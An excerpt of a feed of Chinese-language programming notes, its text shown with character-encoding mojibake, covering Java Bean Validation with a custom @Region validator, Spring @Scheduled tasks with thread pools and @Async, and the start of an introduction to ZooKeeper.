        <span>Validator</span> validator <span>=</span> factory<span>.</span><span>getValidator</span><span>(</span><span>)</span><span>;</span>
        <span>.</span><span>.</span><span>.</span>
        <span>Set</span><span><span>&lt;</span><span>ConstraintViolation</span><span>&lt;</span><span>T</span><span>></span><span>></span></span> violations <span>=</span> validator<span>.</span><span>validate</span><span>(</span>t<span>)</span><span>;</span>
</code></pre></div><p>ä¸Šé¢æ˜¯é€šè¿‡ <code>Validator</code> å·¥å‚ç±»è·å¾—çš„ <code>Validator</code> ç¤ºä¾‹ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥é€šè¿‡ <code>@Autowired</code>  ç›´æ¥æ³¨å…¥çš„æ–¹å¼ã€‚ä½†æ˜¯åœ¨é Spring Component ç±»ä¸­ä½¿ç”¨è¿™ç§æ–¹å¼çš„è¯ï¼Œåªèƒ½é€šè¿‡å·¥å‚ç±»æ¥è·å¾— <code>Validator</code>ã€‚</p>
<div><pre><code>        <span>@Autowired</span>
        <span>Validator</span> validator<span>;</span>
</code></pre></div><h3 id="è‡ªå®šä¹‰-validator" tabindex="-1"> è‡ªå®šä¹‰ Validator</h3>
<p>å¦‚æœè‡ªå¸¦çš„æ ¡éªŒæ³¨è§£æ— æ³•æ»¡è¶³éœ€æ±‚çš„è¯ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰å®ç°æ³¨è§£ã€‚</p>
<p><strong>æ¡ˆä¾‹:æ ¡éªŒç‰¹å®šå­—æ®µçš„å€¼æ˜¯å¦åœ¨å¯é€‰èŒƒå›´</strong></p>
<p>æ¯”å¦‚æˆ‘ä»¬ç°åœ¨å¤šäº†è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼šå¤šäº†ä¸€ä¸ª region å­—æ®µï¼Œregion å­—æ®µåªèƒ½æ˜¯<code>China</code>ã€<code>China-Taiwan</code>ã€<code>China-HongKong</code>è¿™ä¸‰ä¸ªä¸­çš„ä¸€ä¸ªã€‚</p>
<div><pre><code><span>@Target</span><span>(</span><span>{</span>FIELD<span>}</span><span>)</span>
<span>@Retention</span><span>(</span>RUNTIME<span>)</span>
<span>@Constraint</span><span>(</span>validatedBy <span>=</span> <span>RegionValidator</span><span>.</span><span>class</span><span>)</span>
<span>@Documented</span>
<span>public</span> <span>@interface</span> <span>Region</span> <span>{</span>

    <span>String</span> <span>message</span><span>(</span><span>)</span> <span>default</span> <span>"Region å€¼ä¸åœ¨å¯é€‰èŒƒå›´å†…"</span><span>;</span>

    <span>Class</span><span><span>&lt;</span><span>?</span><span>></span></span><span>[</span><span>]</span> <span>groups</span><span>(</span><span>)</span> <span>default</span> <span>{</span><span>}</span><span>;</span>

    <span>Class</span><span><span>&lt;</span><span>?</span> <span>extends</span> <span>Payload</span><span>></span></span><span>[</span><span>]</span> <span>payload</span><span>(</span><span>)</span> <span>default</span> <span>{</span><span>}</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p>ç¬¬äºŒæ­¥ä½ éœ€è¦å®ç° <code>ConstraintValidator</code>æ¥å£ï¼Œå¹¶é‡å†™<code>isValid</code> æ–¹æ³•ï¼š</p>
<div><pre><code><span>import</span> <span><span>javax<span>.</span>validation<span>.</span></span><span>ConstraintValidator</span></span><span>;</span>
<span>import</span> <span><span>javax<span>.</span>validation<span>.</span></span><span>ConstraintValidatorContext</span></span><span>;</span>
<span>import</span> <span><span>java<span>.</span>util<span>.</span></span><span>HashSet</span></span><span>;</span>

<span>public</span> <span>class</span> <span>RegionValidator</span> <span>implements</span> <span>ConstraintValidator</span><span><span>&lt;</span><span>Region</span><span>,</span> <span>String</span><span>></span></span> <span>{</span>

    <span>@Override</span>
    <span>public</span> <span>boolean</span> <span>isValid</span><span>(</span><span>String</span> value<span>,</span> <span>ConstraintValidatorContext</span> context<span>)</span> <span>{</span>
        <span>HashSet</span><span><span>&lt;</span><span>Object</span><span>></span></span> regions <span>=</span> <span>new</span> <span>HashSet</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China"</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China-Taiwan"</span><span>)</span><span>;</span>
        regions<span>.</span><span>add</span><span>(</span><span>"China-HongKong"</span><span>)</span><span>;</span>
        <span>return</span> regions<span>.</span><span>contains</span><span>(</span>value<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>ç°åœ¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ³¨è§£ï¼š</p>
<div><pre><code>    <span>@Region</span>
    <span>private</span> <span>String</span> region<span>;</span>
</code></pre></div><h3 id="notnull-vs-column-nullable-false" tabindex="-1"> <code>@NotNull</code> vs <code>@Column(nullable = false)</code></h3>
<p>åœ¨ä½¿ç”¨ JPA æ“ä½œæ•°æ®çš„æ—¶å€™ä¼šç»å¸¸ç¢°åˆ° <code>@Column(nullable = false)</code>  è¿™ç§ç±»å‹çš„çº¦æŸï¼Œé‚£ä¹ˆå®ƒå’Œ <code>@NotNull</code> æœ‰ä½•åŒºåˆ«å‘¢ï¼Ÿææ¸…æ¥šè¿™ä¸ªè¿˜æ˜¯å¾ˆé‡è¦çš„ï¼</p>
<ul>
<li><code>@NotNull</code>æ˜¯ JSR 303 BeanéªŒè¯æ‰¹æ³¨,å®ƒä¸æ•°æ®åº“çº¦æŸæœ¬èº«æ— å…³ã€‚</li>
<li><code>@Column(nullable = false)</code> : æ˜¯JPAå£°æ˜åˆ—ä¸ºéç©ºçš„æ–¹æ³•ã€‚</li>
</ul>
<p>æ€»ç»“æ¥è¯´å°±æ˜¯å³å‰è€…ç”¨äºéªŒè¯ï¼Œè€Œåè€…åˆ™ç”¨äºæŒ‡ç¤ºæ•°æ®åº“åˆ›å»ºè¡¨çš„æ—¶å€™å¯¹è¡¨çš„çº¦æŸã€‚</p>
<h2 id="spring-schedule-å®šæ—¶ä»»åŠ¡" tabindex="-1"> Spring Schedule å®šæ—¶ä»»åŠ¡</h2>
<h3 id="åˆ›å»º-scheduled-task" tabindex="-1"> åˆ›å»º scheduled task</h3>
<p>ä½¿ç”¨ <code>@Scheduled</code> æ³¨è§£å°±èƒ½å¾ˆæ–¹ä¾¿åœ°åˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œä¸‹é¢çš„ä»£ç ä¸­æ¶µç›–äº† <code>@Scheduled </code>çš„å¸¸è§ç”¨æ³•ï¼ŒåŒ…æ‹¬ï¼šå›ºå®šé€Ÿç‡æ‰§è¡Œã€å›ºå®šå»¶è¿Ÿæ‰§è¡Œã€åˆå§‹å»¶è¿Ÿæ‰§è¡Œã€ä½¿ç”¨ Cron è¡¨è¾¾å¼æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚</p>
<blockquote>
<p>Cron è¡¨è¾¾å¼:  ä¸»è¦ç”¨äºå®šæ—¶ä½œä¸š(å®šæ—¶ä»»åŠ¡)ç³»ç»Ÿå®šä¹‰æ‰§è¡Œæ—¶é—´æˆ–æ‰§è¡Œé¢‘ç‡çš„è¡¨è¾¾å¼ï¼Œéå¸¸å‰å®³ï¼Œä½ å¯ä»¥é€šè¿‡ Cron è¡¨è¾¾å¼è¿›è¡Œè®¾ç½®å®šæ—¶ä»»åŠ¡æ¯å¤©æˆ–è€…æ¯ä¸ªæœˆä»€ä¹ˆæ—¶å€™æ‰§è¡Œç­‰ç­‰æ“ä½œã€‚</p>
<p>æ¨èä¸€ä¸ªåœ¨çº¿Cronè¡¨è¾¾å¼ç”Ÿæˆå™¨ï¼š<a href="http://cron.qqe2.com/" target="_blank" rel="noopener noreferrer">http://cron.qqe2.com/</a></p>
</blockquote>
<div><pre><code><span>@Component</span>
<span>public</span> <span>class</span> <span>ScheduledTasks</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> log <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>ScheduledTasks</span><span>.</span><span>class</span><span>)</span><span>;</span>
    <span>private</span> <span>static</span> <span>final</span> <span>SimpleDateFormat</span> dateFormat <span>=</span> <span>new</span> <span>SimpleDateFormat</span><span>(</span><span>"HH:mm:ss"</span><span>)</span><span>;</span>

    <span>/**
     * fixedRateï¼šå›ºå®šé€Ÿç‡æ‰§è¡Œã€‚æ¯5ç§’æ‰§è¡Œä¸€æ¬¡ã€‚
     */</span>
    <span>@Scheduled</span><span>(</span>fixedRate <span>=</span> <span>5000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedRate</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Current Thread : {}"</span><span>,</span> <span>Thread</span><span>.</span><span>currentThread</span><span>(</span><span>)</span><span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        log<span>.</span><span>info</span><span>(</span><span>"Fixed Rate Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>/**
     * fixedDelayï¼šå›ºå®šå»¶è¿Ÿæ‰§è¡Œã€‚è·ç¦»ä¸Šä¸€æ¬¡è°ƒç”¨æˆåŠŸå2ç§’æ‰æ‰§ã€‚
     */</span>
    <span>@Scheduled</span><span>(</span>fixedDelay <span>=</span> <span>2000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedDelay</span><span>(</span><span>)</span> <span>{</span>
        <span>try</span> <span>{</span>
            <span>TimeUnit</span><span>.</span>SECONDS<span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span><span>;</span>
            log<span>.</span><span>info</span><span>(</span><span>"Fixed Delay Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>/**
     * initialDelay:åˆå§‹å»¶è¿Ÿã€‚ä»»åŠ¡çš„ç¬¬ä¸€æ¬¡æ‰§è¡Œå°†å»¶è¿Ÿ5ç§’ï¼Œç„¶åå°†ä»¥5ç§’çš„å›ºå®šé—´éš”æ‰§è¡Œã€‚
     */</span>
    <span>@Scheduled</span><span>(</span>initialDelay <span>=</span> <span>5000</span><span>,</span> fixedRate <span>=</span> <span>5000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithInitialDelay</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Fixed Rate Task with Initial Delay : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>/**
     * cronï¼šä½¿ç”¨Cronè¡¨è¾¾å¼ã€‚ã€€æ¯åˆ†é’Ÿçš„1ï¼Œ2ç§’è¿è¡Œ
     */</span>
    <span>@Scheduled</span><span>(</span>cron <span>=</span> <span>"1-2 * * * * ? "</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithCronExpression</span><span>(</span><span>)</span> <span>{</span>
        log<span>.</span><span>info</span><span>(</span><span>"Cron Expression: The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><h3 id="å¯åŠ¨ç±»-enableschedulingæ³¨è§£" tabindex="-1"> å¯åŠ¨ç±»<code>@EnableScheduling</code>æ³¨è§£</h3>
<p>åœ¨ SpringBoot ä¸­éœ€è¦åœ¨å¯åŠ¨ç±»ä¸ŠåŠ ä¸Š<code>@EnableScheduling</code>ä¾¿å¯ä»¥å¯åŠ¨å®šæ—¶ä»»åŠ¡äº†ã€‚</p>
<h3 id="è‡ªå®šä¹‰çº¿ç¨‹æ± æ‰§è¡Œ-scheduled-task" tabindex="-1"> è‡ªå®šä¹‰çº¿ç¨‹æ± æ‰§è¡Œ scheduled task</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>@Scheduled</code>ä»»åŠ¡éƒ½åœ¨Springåˆ›å»ºçš„å¤§å°ä¸º1çš„é»˜è®¤çº¿ç¨‹æ± ä¸­æ‰§è¡Œ</p>
<p>å¦‚æœéœ€è¦è‡ªå®šä¹‰çº¿ç¨‹æ± æ‰§è¡Œè¯åªéœ€è¦æ–°åŠ ä¸€ä¸ªå®ç°<code>SchedulingConfigurer</code>æ¥å£çš„ <code>configureTasks</code> çš„ç±»å³å¯ï¼Œè¿™ä¸ªç±»éœ€è¦åŠ ä¸Š <code>@Configuration</code> æ³¨è§£ã€‚</p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>SchedulerConfig</span> <span>implements</span> <span>SchedulingConfigurer</span> <span>{</span>
    <span>private</span> <span>final</span> <span>int</span> POOL_SIZE <span>=</span> <span>10</span><span>;</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>configureTasks</span><span>(</span><span>ScheduledTaskRegistrar</span> scheduledTaskRegistrar<span>)</span> <span>{</span>
        <span>ThreadPoolTaskScheduler</span> threadPoolTaskScheduler <span>=</span> <span>new</span> <span>ThreadPoolTaskScheduler</span><span>(</span><span>)</span><span>;</span>

        threadPoolTaskScheduler<span>.</span><span>setPoolSize</span><span>(</span>POOL_SIZE<span>)</span><span>;</span>
        threadPoolTaskScheduler<span>.</span><span>setThreadNamePrefix</span><span>(</span><span>"my-scheduled-task-pool-"</span><span>)</span><span>;</span>
        threadPoolTaskScheduler<span>.</span><span>initialize</span><span>(</span><span>)</span><span>;</span>

        scheduledTaskRegistrar<span>.</span><span>setTaskScheduler</span><span>(</span>threadPoolTaskScheduler<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h3 id="enableasync-å’Œ-async-ä½¿å®šæ—¶ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œ" tabindex="-1"> @EnableAsync å’Œ @Async  ä½¿å®šæ—¶ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œ</h3>
<p>å¦‚æœæƒ³è¦ä»£ç å¹¶è¡Œæ‰§è¡Œçš„è¯ï¼Œè¿˜å¯ä»¥é€šè¿‡<code>@EnableAsync</code> å’Œ @<code>Async </code>è¿™ä¸¤ä¸ªæ³¨è§£å®ç°</p>
<div><pre><code><span>@Component</span>
<span>@EnableAsync</span>
<span>public</span> <span>class</span> <span>AsyncScheduledTasks</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> log <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>AsyncScheduledTasks</span><span>.</span><span>class</span><span>)</span><span>;</span>
    <span>private</span> <span>static</span> <span>final</span> <span>SimpleDateFormat</span> dateFormat <span>=</span> <span>new</span> <span>SimpleDateFormat</span><span>(</span><span>"HH:mm:ss"</span><span>)</span><span>;</span>

    <span>/**
     * fixedDelayï¼šå›ºå®šå»¶è¿Ÿæ‰§è¡Œã€‚è·ç¦»ä¸Šä¸€æ¬¡è°ƒç”¨æˆåŠŸå2ç§’æ‰æ‰§ã€‚
     */</span>
    <span>//@Async</span>
    <span>@Scheduled</span><span>(</span>fixedDelay <span>=</span> <span>2000</span><span>)</span>
    <span>public</span> <span>void</span> <span>reportCurrentTimeWithFixedDelay</span><span>(</span><span>)</span> <span>{</span>
        <span>try</span> <span>{</span>
            <span>TimeUnit</span><span>.</span>SECONDS<span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span><span>;</span>
            log<span>.</span><span>info</span><span>(</span><span>"Fixed Delay Task : The time is now {}"</span><span>,</span> dateFormat<span>.</span><span>format</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><p>è¿è¡Œç¨‹åºè¾“å‡ºå¦‚ä¸‹ï¼Œ<code>reportCurrentTimeWithFixedDelay()</code>  æ–¹æ³•ä¼šæ¯5ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå› ä¸º<code>@Scheduled</code>ä»»åŠ¡éƒ½åœ¨Springåˆ›å»ºçš„å¤§å°ä¸º1çš„é»˜è®¤çº¿ç¨‹æ± ä¸­æ‰§è¡Œã€‚</p>
<div><pre><code>Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:23
Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:28
Current Thread : scheduling-1
Fixed Delay Task : The time is now 14:24:33
</code></pre></div><p><code>reportCurrentTimeWithFixedDelay()</code> æ–¹æ³•ä¸ŠåŠ ä¸Š <code>@Async</code>   æ³¨è§£åè¾“å‡ºå¦‚ä¸‹ï¼Œ<code>reportCurrentTimeWithFixedDelay()</code>  æ–¹æ³•ä¼šæ¯ 2 ç§’æ‰§è¡Œä¸€æ¬¡ã€‚</p>
<div><pre><code>Current Thread : task-1
Fixed Delay Task : The time is now 14:27:32
Current Thread : task-2
Fixed Delay Task : The time is now 14:27:34
Current Thread : task-3
Fixed Delay Task : The time is now 14:27:36
</code></pre></div><h2 id="spring-boot-å¼‚æ­¥ç¼–ç¨‹" tabindex="-1"> Spring Boot å¼‚æ­¥ç¼–ç¨‹</h2>
<h1 id="spring-security" tabindex="-1"> Spring Security</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Zookeeper ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Zookeeper.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="zookeeper-ä»‹ç»" tabindex="-1"> Zookeeper ä»‹ç»</h1>
<h2 id="zookeeper-çš„ç”±æ¥" tabindex="-1"> ZooKeeper çš„ç”±æ¥</h2>
<p><strong>ä¸‹é¢è¿™æ®µå†…å®¹æ‘˜è‡ªã€Šä»Paxosåˆ°Zookeeperã€‹ç¬¬å››ç« ç¬¬ä¸€èŠ‚çš„æŸæ®µå†…å®¹ï¼š</strong></p>
<blockquote>
<p>Zookeeperæœ€æ—©èµ·æºäºé›…è™ç ”ç©¶é™¢çš„ä¸€ä¸ªç ”ç©¶å°ç»„ã€‚åœ¨å½“æ—¶ï¼Œç ”ç©¶äººå‘˜å‘ç°ï¼Œåœ¨é›…è™å†…éƒ¨å¾ˆå¤šå¤§å‹ç³»ç»ŸåŸºæœ¬éƒ½éœ€è¦ä¾èµ–ä¸€ä¸ªç±»ä¼¼çš„ç³»ç»Ÿæ¥è¿›è¡Œåˆ†å¸ƒå¼åè°ƒï¼Œä½†æ˜¯è¿™äº›ç³»ç»Ÿå¾€å¾€éƒ½å­˜åœ¨åˆ†å¸ƒå¼å•ç‚¹é—®é¢˜ã€‚æ‰€ä»¥ï¼Œ<strong>é›…è™çš„å¼€å‘äººå‘˜å°±è¯•å›¾å¼€å‘ä¸€ä¸ªé€šç”¨çš„æ— å•ç‚¹é—®é¢˜çš„åˆ†å¸ƒå¼åè°ƒæ¡†æ¶ï¼Œä»¥ä¾¿è®©å¼€å‘äººå‘˜å°†ç²¾åŠ›é›†ä¸­åœ¨å¤„ç†ä¸šåŠ¡é€»è¾‘ä¸Šã€‚</strong></p>
<p>å…³äºâ€œZooKeeperâ€è¿™ä¸ªé¡¹ç›®çš„åå­—ï¼Œå…¶å®ä¹Ÿæœ‰ä¸€æ®µè¶£é—»ã€‚åœ¨ç«‹é¡¹åˆæœŸï¼Œè€ƒè™‘åˆ°ä¹‹å‰å†…éƒ¨å¾ˆå¤šé¡¹ç›®éƒ½æ˜¯ä½¿ç”¨åŠ¨ç‰©çš„åå­—æ¥å‘½åçš„ï¼ˆä¾‹å¦‚è‘—åçš„Pigé¡¹ç›®),é›…è™çš„å·¥ç¨‹å¸ˆå¸Œæœ›ç»™è¿™ä¸ªé¡¹ç›®ä¹Ÿå–ä¸€ä¸ªåŠ¨ç‰©çš„åå­—ã€‚æ—¶ä»»ç ”ç©¶é™¢çš„é¦–å¸­ç§‘å­¦å®¶RaghuRamakrishnanå¼€ç©ç¬‘åœ°è¯´ï¼šâ€œåœ¨è¿™æ ·ä¸‹å»ï¼Œæˆ‘ä»¬è¿™å„¿å°±å˜æˆåŠ¨ç‰©å›­äº†ï¼â€æ­¤è¯ä¸€å‡ºï¼Œå¤§å®¶çº·çº·è¡¨ç¤ºå°±å«åŠ¨ç‰©å›­ç®¡ç†å‘˜å§ä¸€ä¸€ä¸€å› ä¸ºå„ä¸ªä»¥åŠ¨ç‰©å‘½åçš„åˆ†å¸ƒå¼ç»„ä»¶æ”¾åœ¨ä¸€èµ·ï¼Œ<strong>é›…è™çš„æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçœ‹ä¸Šå»å°±åƒä¸€ä¸ªå¤§å‹çš„åŠ¨ç‰©å›­äº†ï¼Œè€ŒZookeeperæ­£å¥½è¦ç”¨æ¥è¿›è¡Œåˆ†å¸ƒå¼ç¯å¢ƒçš„åè°ƒä¸€ä¸€äºæ˜¯ï¼ŒZookeeperçš„åå­—ä¹Ÿå°±ç”±æ­¤è¯ç”Ÿäº†ã€‚</strong></p>
</blockquote>
<h2 id="zookeeper-æ¦‚è§ˆ" tabindex="-1"> ZooKeeper æ¦‚è§ˆ</h2>
<p>ZooKeeper æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ï¼ŒZooKeeperæ¡†æ¶æœ€åˆæ˜¯åœ¨â€œYahoo!&quot;ä¸Šæ„å»ºçš„ï¼Œç”¨äºä»¥ç®€å•è€Œç¨³å¥çš„æ–¹å¼è®¿é—®ä»–ä»¬çš„åº”ç”¨ç¨‹åºã€‚ åæ¥ï¼ŒApache ZooKeeperæˆä¸ºHadoopï¼ŒHBaseå’Œå…¶ä»–åˆ†å¸ƒå¼æ¡†æ¶ä½¿ç”¨çš„æœ‰ç»„ç»‡æœåŠ¡çš„æ ‡å‡†ã€‚ ä¾‹å¦‚ï¼ŒApache HBaseä½¿ç”¨ZooKeeperè·Ÿè¸ªåˆ†å¸ƒå¼æ•°æ®çš„çŠ¶æ€ã€‚<strong>ZooKeeper çš„è®¾è®¡ç›®æ ‡æ˜¯å°†é‚£äº›å¤æ‚ä¸”å®¹æ˜“å‡ºé”™çš„åˆ†å¸ƒå¼ä¸€è‡´æ€§æœåŠ¡å°è£…èµ·æ¥ï¼Œæ„æˆä¸€ä¸ªé«˜æ•ˆå¯é çš„åŸè¯­é›†ï¼Œå¹¶ä»¥ä¸€ç³»åˆ—ç®€å•æ˜“ç”¨çš„æ¥å£æä¾›ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</strong></p>
<blockquote>
<p><strong>åŸè¯­ï¼š</strong> æ“ä½œç³»ç»Ÿæˆ–è®¡ç®—æœºç½‘ç»œç”¨è¯­èŒƒç•´ã€‚æ˜¯ç”±è‹¥å¹²æ¡æŒ‡ä»¤ç»„æˆçš„ï¼Œç”¨äºå®Œæˆä¸€å®šåŠŸèƒ½çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚å…·æœ‰ä¸å¯åˆ†å‰²æ€§ï¼Œå³åŸè¯­çš„æ‰§è¡Œå¿…é¡»æ˜¯è¿ç»­çš„ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸å…è®¸è¢«ä¸­æ–­ã€‚</p>
</blockquote>
<p><strong>ZooKeeper æ˜¯ä¸€ä¸ªå…¸å‹çš„åˆ†å¸ƒå¼æ•°æ®ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆï¼Œåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºå¯ä»¥åŸºäº ZooKeeper å®ç°è¯¸å¦‚æ•°æ®å‘å¸ƒ/è®¢é˜…ã€è´Ÿè½½å‡è¡¡ã€å‘½åæœåŠ¡ã€åˆ†å¸ƒå¼åè°ƒ/é€šçŸ¥ã€é›†ç¾¤ç®¡ç†ã€Master é€‰ä¸¾ã€åˆ†å¸ƒå¼é”å’Œåˆ†å¸ƒå¼é˜Ÿåˆ—ç­‰åŠŸèƒ½ã€‚</strong></p>
<p><strong>Zookeeper ä¸€ä¸ªæœ€å¸¸ç”¨çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯ç”¨äºæ‹…ä»»æœåŠ¡ç”Ÿäº§è€…å’ŒæœåŠ¡æ¶ˆè´¹è€…çš„æ³¨å†Œä¸­å¿ƒ(æä¾›å‘å¸ƒè®¢é˜…æœåŠ¡)ã€‚</strong> æœåŠ¡ç”Ÿäº§è€…å°†è‡ªå·±æä¾›çš„æœåŠ¡æ³¨å†Œåˆ°Zookeeperä¸­å¿ƒï¼ŒæœåŠ¡çš„æ¶ˆè´¹è€…åœ¨è¿›è¡ŒæœåŠ¡è°ƒç”¨çš„æ—¶å€™å…ˆåˆ°Zookeeperä¸­æŸ¥æ‰¾æœåŠ¡ï¼Œè·å–åˆ°æœåŠ¡ç”Ÿäº§è€…çš„è¯¦ç»†ä¿¡æ¯ä¹‹åï¼Œå†å»è°ƒç”¨æœåŠ¡ç”Ÿäº§è€…çš„å†…å®¹ä¸æ•°æ®ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨ Dubboæ¶æ„ä¸­ Zookeeper å°±æ‹…ä»»äº†æ³¨å†Œä¸­å¿ƒè¿™ä¸€è§’è‰²ã€‚</p>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubboæ¶æ„.png" alt="Dubbo" loading="lazy"></p>
<h1 id="zookeeper-çš„é‡è¦æ¦‚å¿µ" tabindex="-1"> ZooKeeper çš„é‡è¦æ¦‚å¿µ</h1>
<h2 id="æ€»ç»“" tabindex="-1"> æ€»ç»“</h2>
<ul>
<li><strong>ZooKeeper æœ¬èº«å°±æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç¨‹åºï¼ˆåªè¦åŠæ•°ä»¥ä¸ŠèŠ‚ç‚¹å­˜æ´»ï¼ŒZooKeeper å°±èƒ½æ­£å¸¸æœåŠ¡ï¼‰ã€‚</strong></li>
<li><strong>ä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼Œæœ€å¥½æ˜¯ä»¥é›†ç¾¤å½¢æ€æ¥éƒ¨ç½² ZooKeeperï¼Œè¿™æ ·åªè¦é›†ç¾¤ä¸­å¤§éƒ¨åˆ†æœºå™¨æ˜¯å¯ç”¨çš„ï¼ˆèƒ½å¤Ÿå®¹å¿ä¸€å®šçš„æœºå™¨æ•…éšœï¼‰ï¼Œé‚£ä¹ˆ ZooKeeper æœ¬èº«ä»ç„¶æ˜¯å¯ç”¨çš„ã€‚</strong></li>
